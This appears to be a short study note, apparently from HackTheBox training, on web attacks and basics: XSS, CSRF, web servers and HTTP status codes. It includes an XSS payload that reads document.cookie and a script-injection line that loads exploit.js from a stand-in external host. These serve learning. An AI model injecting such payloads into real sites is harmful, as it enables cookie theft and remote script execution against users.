[[HackTheBox]]

## Crossite Scripting
injecting JavaScript code to be executed on the client-side.
ex. payload
```
#"><img src=/ onerror=alert(document.cookie)>
```
## Cross-Site Request Forgery (CSRF)
attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.
```
"><script src=//www.example.com/exploit.js></script>
```
## Web Servers
is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser. Web servers usually run on TCP ports 80 or 443, and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.

## HTTP Status Codes

| Code | Description                        | Meaning                                                                 |
|------|------------------------------------|-------------------------------------------------------------------------|
| **200** | OK                             | The request has succeeded.                                              |
| **301** | Moved Permanently              | The URL of the requested resource has been changed permanently.         |
| **302** | Found                          | The URL of the requested resource has been changed temporarily.         |
| **400** | Bad Request                    | The server could not understand the request due to invalid syntax.      |
| **401** | Unauthorized                   | Unauthenticated attempt to access page.                                 |
| **403** | Forbidden                      | The client does not have access rights to the content.                  |
| **404** | Not Found                      | The server cannot find the requested resource.                          |
| **405** | Method Not Allowed             | The request method is known but has been disabled.                      |
| **408** | Request Timeout                | The server timed out waiting for the request.                           |
| **500** | Internal Server Error          | The server encountered an unexpected condition.                         |
| **502** | Bad Gateway                    | The server received an invalid response from the upstream server.       |
| **504** | Gateway Timeout                | The server, acting as a gateway, timed out waiting for a response.      |
